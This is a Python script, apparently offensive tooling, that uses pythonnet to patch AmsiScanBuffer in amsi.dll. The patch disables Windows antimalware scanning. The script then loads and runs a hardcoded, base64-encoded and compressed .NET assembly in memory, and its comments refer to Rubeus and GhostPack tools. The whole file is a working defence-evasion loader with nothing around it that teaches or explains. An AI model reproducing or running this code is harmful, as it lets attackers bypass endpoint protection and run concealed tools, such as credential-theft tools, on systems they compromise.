import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SqlClient.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()